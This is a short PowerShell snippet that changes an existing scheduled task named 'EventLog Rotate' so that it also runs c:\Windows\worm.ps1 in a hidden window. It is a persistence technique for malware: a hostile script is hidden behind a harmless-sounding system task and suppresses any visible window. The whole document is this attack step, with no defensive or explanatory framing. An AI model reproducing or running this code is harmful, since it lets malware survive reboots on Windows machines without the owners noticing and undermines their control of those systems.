Get-ScheduledTask -TaskName 'EventLog Rotate' | ForEach-Object{ $actions = $_.Actions 


$actions += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "c:\Windows\worm.ps1"'
Set-ScheduledTask -TaskName "EventLog Rotate" -Action $actions
}